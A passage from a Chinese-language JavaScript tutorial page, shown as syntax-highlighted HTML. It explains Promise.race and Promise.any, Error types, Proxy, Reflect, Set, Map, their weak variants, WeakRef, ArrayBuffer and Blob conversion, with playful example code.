  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>[</span><span>4396</span><span>,</span> <span>999</span><span>]</span><span>.</span><span>includes</span><span>(</span>delay<span>)</span><span>)</span> <span>{</span>
        <span>reject</span><span>(</span><span>{</span> <span>4396</span><span>:</span> <span>'clearlove7'</span><span>,</span> <span>999</span><span>:</span> <span>'kid'</span> <span>}</span><span>[</span>delay<span>]</span><span>)</span>
      <span>}</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>await</span> Promise<span>.</span><span>race</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>777</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>4396</span><span>)</span><span>]</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => 777</span>

  <span>await</span> Promise<span>.</span><span>race</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>1557</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>999</span><span>)</span><span>]</span><span>)</span><span>.</span><span>catch</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 'kid'</span>
<span>}</span>

<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>Promise.any() —— 起草方案</p>
<blockquote>
<ul>
<li>与 Promise.all() 相反，当数组中有一个 promise 为 fulfilled（成功态）时 Promise.any() 状态为 resolve，返回状态最先确认的 promise。</li>
<li>反之 Promise.any() 状态为 reject，返回 'AggregateError: All promises were rejected'。</li>
<li>注意：Promise.any([]) 会立即失败。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>[</span><span>4396</span><span>,</span> <span>2200</span><span>]</span><span>.</span><span>includes</span><span>(</span>delay<span>)</span><span>)</span> <span>{</span>
        <span>reject</span><span>(</span><span>{</span> <span>4396</span><span>:</span> <span>'clearlove7'</span><span>,</span> <span>2200</span><span>:</span> <span>'xiaohu'</span> <span>}</span><span>[</span>delay<span>]</span><span>)</span>
      <span>}</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>await</span> Promise<span>.</span><span>any</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>777</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>1557</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>4396</span><span>)</span><span>]</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => 777</span>

  <span>await</span> Promise<span>.</span><span>any</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>4396</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>2200</span><span>)</span><span>]</span><span>)</span><span>.</span><span>catch</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 'AggregateError: All promises were rejected'</span>
<span>}</span>

<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>值穿透。</p>
<div><pre><code>Promise<span>.</span><span>resolve</span><span>(</span><span>777</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>4396</span><span>)</span>
  <span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 777</span>

Promise<span>.</span><span>resolve</span><span>(</span><span>777</span><span>)</span>
  <span>.</span><span>then</span><span>(</span>Promise<span>.</span><span>resolve</span><span>(</span><span>4396</span><span>)</span><span>)</span>
  <span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 777</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p><a href="https://juejin.cn/post/6844904077537574919" target="_blank" rel="noopener noreferrer">【建议星星】要就来 45 道 Promise 面试题一次爽到底(1.1w 字用心整理) - LinDaiDai_霖呆呆</a></p>
</li>
</ul>
<h2 id="_6-error"> 6. Error</h2>
<ul>
<li>throw 抛出 Error 错误，可终止函数运行。</li>
</ul>
<div><pre><code><span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'抛出一个错误'</span><span>)</span>

<span>EvalError</span><span>(</span><span>'eval错误'</span><span>)</span>
<span>InternalError</span><span>(</span><span>'JavaScript引擎内部异常错误'</span><span>)</span>
<span>RangeError</span><span>(</span><span>'值不在其所允许的范围或者集合中错误'</span><span>)</span>
<span>ReferenceError</span><span>(</span><span>'引用错误'</span><span>)</span>
<span>SyntaxError</span><span>(</span><span>'语法错误'</span><span>)</span>
<span>TypeError</span><span>(</span><span>'类型错误'</span><span>)</span>
<span>URIError</span><span>(</span><span>'URI处理函数产生的错误'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_7-proxy"> 7. Proxy</h2>
<ul>
<li>浅代理，给某一个对象提供一个代理对象，并由代理对象控制对原对象的引用（<a href="https://es6.ruanyifeng.com/#docs/proxy" target="_blank" rel="noopener noreferrer">ECMAScript 6 入门 - 阮一峰</a>）。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>[</span><span>'姜姒'</span><span>,</span> <span>'裴南苇'</span><span>]</span><span>,</span>
  <span>skill</span><span>:</span> <span>{</span>
    <span>name</span><span>:</span> <span>'天下第二'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>const</span> proxy <span>=</span> <span>new</span> <span>Proxy</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>get</span><span>(</span>target<span>,</span> key<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>===</span> <span>'wife'</span><span>)</span> console<span>.</span><span>log</span><span>(</span><span>'风紧，扯呼！'</span><span>)</span>
    <span>return</span> target<span>[</span>key<span>]</span>
  <span>}</span><span>,</span>
  <span>set</span><span>(</span>target<span>,</span> key<span>,</span> value<span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'裆下有些忧郁啊！'</span><span>)</span> <span>// 设置 proxy.skill.name 的值时不会打印这句话</span>
    <span>return</span> <span>(</span>target<span>[</span>key<span>]</span> <span>=</span> value<span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

proxy<span>.</span>wife <span>// '风紧，扯呼！'</span>
proxy<span>.</span>name <span>=</span> <span>'徐凤年'</span> <span>// '裆下有些忧郁啊！'</span>
proxy<span>.</span>skill<span>.</span>name <span>=</span> <span>'天下第一'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_8-reflect"> 8. Reflect</h2>
<ul>
<li>
<p>Reflect 对象与 Proxy 对象一样，也是 ES6 为了操作对象而提供的新 API（<a href="https://es6.ruanyifeng.com/#docs/reflect" target="_blank" rel="noopener noreferrer">ECMAScript 6 入门 - 阮一峰</a>）。</p>
</li>
<li>
<ol>
<li>将 Object 对象的一些明显属于语言内部的方法（比如 Object.defineProperty），放到 Reflect 对象上。</li>
</ol>
</li>
<li>
<ol start="2">
<li>修改某些 Object 方法的返回结果，让其变得更合理。</li>
</ol>
<div><pre><code><span>// 老写法</span>
<span>try</span> <span>{</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> property<span>,</span> attributes<span>)</span>
  <span>// success</span>
<span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
  <span>// failure</span>
<span>}</span>

<span>// 新写法</span>
<span>if</span> <span>(</span>Reflect<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> property<span>,</span> attributes<span>)</span><span>)</span> <span>{</span>
  <span>// success</span>
<span>}</span> <span>else</span> <span>{</span>
  <span>// failure</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<ol start="3">
<li>让 Object 操作都变成函数行为。</li>
</ol>
<div><pre><code><span>// 老写法</span>
<span>'assign'</span> <span>in</span> Object <span>// => true</span>

<span>// 新写法</span>
Reflect<span>.</span><span>has</span><span>(</span>Object<span>,</span> <span>'assign'</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<ol start="4">
<li>Reflect 对象的方法与 Proxy 对象的方法一一对应，只要是 Proxy 对象的方法，就能在 Reflect 对象上找到对应的方法。</li>
</ol>
<div><pre><code><span>const</span> loggedObj <span>=</span> <span>new</span> <span>Proxy</span><span>(</span>obj<span>,</span> <span>{</span>
  <span>get</span><span>(</span>target<span>,</span> name<span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'get'</span><span>,</span> target<span>,</span> name<span>)</span>
    <span>return</span> Reflect<span>.</span><span>get</span><span>(</span>target<span>,</span> name<span>)</span>
  <span>}</span><span>,</span>
  <span>deleteProperty</span><span>(</span><span>target<span>,</span> name</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'delete'</span> <span>+</span> name<span>)</span>
    <span>return</span> Reflect<span>.</span><span>deleteProperty</span><span>(</span>target<span>,</span> name<span>)</span>
  <span>}</span><span>,</span>
  <span>has</span><span>(</span><span>target<span>,</span> name</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'has'</span> <span>+</span> name<span>)</span>
    <span>return</span> Reflect<span>.</span><span>has</span><span>(</span>target<span>,</span> name<span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<ol start="5">
<li>Reflect.apply。</li>
</ol>
<div><pre><code><span>// 老写法</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>apply</span><span>.</span><span>call</span><span>(</span>Math<span>.</span>floor<span>,</span> <span>undefined</span><span>,</span> <span>[</span><span>1.75</span><span>]</span><span>)</span> <span>// => 1</span>

<span>// 新写法</span>
<span>Reflect</span><span>.</span><span>apply</span><span>(</span>Math<span>.</span>floor<span>,</span> <span>undefined</span><span>,</span> <span>[</span><span>1.75</span><span>]</span><span>)</span> <span>// => 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
</ul>
<h2 id="_9-set-weakset"> 9. Set &amp; WeakSet</h2>
<ul>
<li>
<p>Set 传入可迭代对象，值是唯一的，可以存储任何类型。</p>
<div><pre><code><span>const</span> set <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>[</span><span>7</span><span>,</span> <span>7</span><span>,</span> <span>'7'</span><span>,</span> <span>{</span><span>}</span><span>]</span><span>)</span>

<span>// 添加元素</span>
set<span>.</span><span>add</span><span>(</span><span>4396</span><span>)</span><span>.</span><span>add</span><span>(</span><span>4396</span><span>)</span> <span>// => {7, '7', {}, 4396}</span>
<span>// 检测是否存在</span>
set<span>.</span><span>has</span><span>(</span><span>7</span><span>)</span> <span>// => true</span>
<span>// 删除指定元素</span>
set<span>.</span><span>delete</span><span>(</span><span>4396</span><span>)</span> <span>// => true</span>
<span>// 获取数量</span>
set<span>.</span>size <span>// => 3</span>
<span>// 清空所有元素</span>
set<span>.</span><span>clear</span><span>(</span><span>)</span> <span>// => undefined</span>
<span>// forEach遍历（value = key）</span>
set<span>.</span><span>forEach</span><span>(</span><span>(</span><span>value<span>,</span> key</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>value<span>,</span> key<span>)</span><span>)</span> <span>// => 依次打印：7 7 -> '7' '7' -> {} {}</span>
<span>// keys/values/entries 返回可迭代对象（value = key）</span>
<span>for</span> <span>(</span><span>const</span> key <span>of</span> set<span>.</span><span>keys</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>)</span> <span>// => 依次打印：7 -> '7' -> {}</span>
<span>for</span> <span>(</span><span>const</span> value <span>of</span> set<span>.</span><span>values</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// => 依次打印：7 -> '7' -> {}</span>
<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> set<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// => 依次打印：7 7 -> '7' '7' -> {} {}</span>
<span>// 获取第一个元素</span>
set<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => 7</span>
set<span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => 7</span>
set<span>.</span><span>entries</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => [7, 7]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div></li>
<li>
<p>转为数组。</p>
<div><pre><code>Array<span>.</span><span>from</span><span>(</span><span>new</span> <span>Set</span><span>(</span><span>[</span><span>7</span><span>,</span> <span>7</span><span>,</span> <span>'7'</span><span>]</span><span>)</span><span>)</span> <span>// => [7, '7']</span>
<span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span><span>[</span><span>7</span><span>,</span> <span>7</span><span>,</span> <span>'7'</span><span>]</span><span>)</span><span>]</span> <span>// => [7, '7']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>集合运算。</p>
<div><pre><code><span>const</span> jack <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>[</span><span>'love'</span><span>,</span> <span>'ashui'</span><span>]</span><span>)</span>
<span>const</span> clear <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>[</span><span>'love'</span><span>,</span> <span>'cangzhang'</span><span>]</span><span>)</span>

<span>// 交集</span>
<span>new</span> <span>Set</span><span>(</span><span>[</span><span>...</span>jack<span>]</span><span>.</span><span>filter</span><span>(</span><span>i</span> <span>=></span> clear<span>.</span><span>has</span><span>(</span>i<span>)</span><span>)</span><span>)</span> <span>// => {'love'}</span>
<span>// 并集</span>
<span>new</span> <span>Set</span><span>(</span><span>[</span><span>...</span>jack<span>,</span> <span>...</span>clear<span>]</span><span>)</span> <span>// => {'love', 'ashui', 'cangzhang'}</span>
<span>// 差集</span>
<span>new</span> <span>Set</span><span>(</span><span>[</span><span>...</span>jack<span>]</span><span>.</span><span>filter</span><span>(</span><span>i</span> <span>=></span> <span>!</span>clear<span>.</span><span>has</span><span>(</span>i<span>)</span><span>)</span><span>)</span> <span>// => {'ashui'}</span>
<span>// 对称差集</span>
<span>new</span> <span>Set</span><span>(</span>
  <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span><span>[</span><span>...</span>jack<span>,</span> <span>...</span>clear<span>]</span><span>)</span><span>]</span><span>.</span><span>filter</span><span>(</span>
    <span>u</span> <span>=></span> <span>!</span><span>new</span> <span>Set</span><span>(</span><span>[</span><span>...</span>jack<span>]</span><span>.</span><span>filter</span><span>(</span><span>i</span> <span>=></span> clear<span>.</span><span>has</span><span>(</span>i<span>)</span><span>)</span><span>)</span><span>.</span><span>has</span><span>(</span>u<span>)</span>
  <span>)</span>
<span>)</span> <span>// => {'ashui', 'cangzhang'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
<li>
<p>WeakSet 与 Set 类似，但只能存储引用数据类型，为弱引用类型，无遍历操作。</p>
<blockquote>
<p>可以用来存储 Dom 节点，当 Dom 节点被删除及无额外引用变量时会自动回收，提升性能。</p>
</blockquote>
<div><pre><code><span>// ['jack'] 会被垃圾回收机制回收，届时 weakSet 上不会有 ['jack']</span>
<span>const</span> weakSet <span>=</span> <span>new</span> <span>WeakSet</span><span>(</span><span>[</span><span>[</span><span>'jack'</span><span>]</span><span>]</span><span>)</span>
<span>const</span> pony <span>=</span> <span><span>/</span><span>pony</span><span>/</span></span>

<span>// 添加元素</span>
weakSet<span>.</span><span>add</span><span>(</span>pony<span>)</span><span>.</span><span>add</span><span>(</span>pony<span>)</span> <span>// => {['jack'], /pony/}</span>
<span>// 检测是否存在</span>
weakSet<span>.</span><span>has</span><span>(</span>pony<span>)</span> <span>// => true</span>
<span>// 删除指定元素</span>
weakSet<span>.</span><span>delete</span><span>(</span>pony<span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
</ul>
<h2 id="_10-map-weakmap"> 10. Map &amp; WeakMap</h2>
<ul>
<li>
<p>Map 与普通对象类似，传入可迭代对象，但可以使用任何类型作为键，并且结构稳定（能够记住所插入的顺序）。</p>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
<span>}</span>
<span>const</span> harem <span>=</span> <span>{</span><span>}</span>

<span>const</span> map <span>=</span> <span>new</span> <span>Map</span><span>(</span>Object<span>.</span><span>entries</span><span>(</span>foo<span>)</span><span>)</span> <span>// => {'name' => '徐扶墙', 'age' => 17}</span>
<span>// 添加键</span>
map<span>.</span><span>set</span><span>(</span>harem<span>,</span> <span>'姜姒'</span><span>)</span><span>.</span><span>set</span><span>(</span>harem<span>,</span> <span>'裴南苇'</span><span>)</span> <span>// => {'name' => '徐扶墙', 'age' => 17, {} => '裴南苇'}</span>
<span>// 读取值</span>
map<span>.</span><span>get</span><span>(</span>harem<span>)</span> <span>// => '裴南苇'</span>
<span>// 检测是否存在</span>
map<span>.</span><span>has</span><span>(</span>harem<span>)</span> <span>// => true</span>
<span>// 删除指定元素</span>
map<span>.</span><span>delete</span><span>(</span>harem<span>)</span> <span>// => true</span>
<span>// 获取数量</span>
map<span>.</span>size <span>// => 2</span>
<span>// 清空所有元素</span>
map<span>.</span><span>clear</span><span>(</span><span>)</span> <span>// => undefined</span>
<span>// forEach遍历</span>
map<span>.</span><span>forEach</span><span>(</span><span>(</span><span>value<span>,</span> key</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>value<span>,</span> key<span>)</span><span>)</span> <span>// => 依次打印：徐扶墙 name -> 17 'age'</span>
<span>// keys/values/entries 返回可迭代对象</span>
<span>for</span> <span>(</span><span>const</span> key <span>of</span> map<span>.</span><span>keys</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>)</span> <span>// => 依次打印：'name' -> 'age'</span>
<span>for</span> <span>(</span><span>const</span> value <span>of</span> map<span>.</span><span>values</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// => 依次打印：'徐扶墙' -> 17</span>
<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> map<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// => 依次打印：'name' '徐扶墙' -> 'age' 17</span>
<span>// 获取第一个元素</span>
map<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => 'name'</span>
map<span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => '徐扶墙'</span>
map<span>.</span><span>entries</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => ['name', '徐扶墙']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div></li>
<li>
<p>WeakMap 与 Map 类似，但键只能是引用数据类型，为弱引用类型，无遍历操作。</p>
<blockquote>
<ol>
<li>可以用来保存 Dom 节点，当 Dom 节点被删除及无额外引用变量时会自动回收，提升性能。</li>
<li>可实现私有变量，当实例销毁后回收私有变量（有点鸡肋了）。</li>
</ol>
</blockquote>
<div><pre><code><span>// ['jack'] 会被垃圾回收机制回收，届时 weakMap 上不会有 ['jack']</span>
<span>const</span> weakMap <span>=</span> <span>new</span> <span>WeakMap</span><span>(</span><span>[</span><span>[</span><span>[</span><span>'jack'</span><span>]</span><span>,</span> <span>'jack'</span><span>]</span><span>]</span><span>)</span>
<span>const</span> pony <span>=</span> <span><span>/</span><span>pony</span><span>/</span></span>

<span>// 添加键</span>
weakMap<span>.</span><span>set</span><span>(</span>pony<span>,</span> <span>'pony'</span><span>)</span> <span>// => {['jack'] => 'jack', /pony/ => 'pony'}</span>
<span>// 读取值</span>
weakMap<span>.</span><span>get</span><span>(</span>pony<span>,</span> <span>'pony'</span><span>)</span> <span>// => 'pony'</span>
<span>// 检测是否存在</span>
weakMap<span>.</span><span>has</span><span>(</span>pony<span>)</span> <span>// => true</span>
<span>// 删除指定元素</span>
weakMap<span>.</span><span>delete</span><span>(</span>pony<span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
</ul>
<h2 id="_11-weakref"> 11. WeakRef</h2>
<ul>
<li>
<p>保留对一个对象的弱引用。</p>
<blockquote>
<p>可以用来保存 Dom 节点，当 Dom 节点被删除及无额外引用变量时会自动回收，提升性能。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>// /LeSe/ 会被垃圾回收机制回收，届时从 weakRef 取值为 undefined</span>
<span>const</span> weakRef <span>=</span> <span>new</span> <span>WeakRef</span><span>(</span><span><span>/</span><span>LeSe</span><span>/</span></span><span>)</span>

<span>// 读取值</span>
weakRef<span>.</span><span>deref</span><span>(</span><span>)</span> <span>// => /LeSe/</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_12-arraybuffer"> 12. ArrayBuffer</h2>
<ul>
<li>
<p>用来表示通用的、固定长度的原始二进制数据缓冲区。不能直接操作，可以通过 TypedArray 或 DataView 对象操作二进制数据，可用于合成/生成 Blob 或 File 对象。</p>
<div><pre><code><span>new</span> <span>Uint8Array</span><span>(</span><span>3</span><span>)</span> <span>// => [0, 0, 0, buffer: ArrayBuffer(3), byteLength: 3, byteOffset: 0, length: 3]</span>

<span>// 同 Array.form()</span>
Uint8Array<span>.</span><span>from</span><span>(</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>)</span> <span>// => [1, 2, 3, buffer: ArrayBuffer(3), byteLength: 3, byteOffset: 0, length: 3]</span>

<span>// 同 Array.of()</span>
Uint8Array<span>.</span><span>of</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)</span> <span>// => [1, 2, 3, buffer: ArrayBuffer(3), byteLength: 3, byteOffset: 0, length: 3]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p>Blob/File 转 ArrayBuffer。</p>
<div><pre><code><span>function</span> <span>blob2Buffer</span><span>(</span><span>blob</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> reader <span>=</span> <span>new</span> <span>FileReader</span><span>(</span><span>)</span>
    reader<span>.</span><span>readAsArrayBuffer</span><span>(</span>blob<span>)</span>
    reader<span>.</span><span>onload</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>reader<span>.</span>result<span>)</span>
    reader<span>.</span><span>onerror</span> <span>=</span> <span>error</span> <span>=></span> <span>reject</span><span>(</span>error<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
</ul>
<h2 id="_13-blob"> 13. Blob</h2>
<ul>
<li>
<p>Binary Large Object 的缩写，表示一个不可变、原始数据的类文件对象。</p>
<blockquote>
<p>blob.slice() 方法可用于文件切片上传功能。</p>
</blockquote>
<div><pre><code><span>new</span> <span>Blob</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>,</span> <span>{</span> <span>type</span><span>:</span> <span>'text/plain'</span> <span>}</span><span>)</span> <span>// => {size: 10, type: 'text/plain'}</span>

<span>// File 转 Blob</span>
<span>new</span> <span>Blob</span><span>(</span><span>[</span>file<span>]</span><span>,</span> <span>{</span> <span>type</span><span>:</span> file<span>.</span>type <span>}</span><span>)</span>
<span>// ArrayBuffer 转 Blob</span>
<span>new</span> <span>Blob</span><span>(</span><span>[</span>buffer<span>]</span><span>,</span> <span>{</span> <span>type</span><span>:</span> <span>'application/json'</span> <span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>Base64 转 Blob。</p>
<div><pre><code><span>function</span> <span>dataUrl2Blob</span><span>(</span><span>dataUrl</span><span>)</span> <span>{</span>
  <span>let</span> ary <span>=</span> dataUrl<span>.</span><span>split</span><span>(</span><span>','</span><span>)</span><span>,</span>
    mime <span>=</span> ary<span>[</span><span>0</span><span>]</span><span>.</span><span>match</span><span>(</span><span><span>/</span><span>:(.*?);</span><span>/</span></span><span>)</span><span>[</span><span>1</span><span>]</span><span>,</span>
    base64 <span>=</span> <span>atob</span><span>(</span>ary<span>[</span><span>1</span><span>]</span><span>)</span><span>,</span>
    n <span>=</span> base64<span>.</span>length<span>,</span>
    u8ary <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span>n<span>)</span>
  <span>while</span> <span>(</span>n<span>--</span><span>)</span> u8ary<span>[</span>n<span>]</span> <span>=</span> base64<span>.</span><span>charCodeAt</span><span>(</span>n<span>)</span>
  <span>return</span> <span>new</span> <span>Blob</span><span>(</span><span>[</span>u8ary<span>]</span><span>,</span> <span>{</span> <span>type</span><span>:</span> mime <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>下载 Blob。</p>
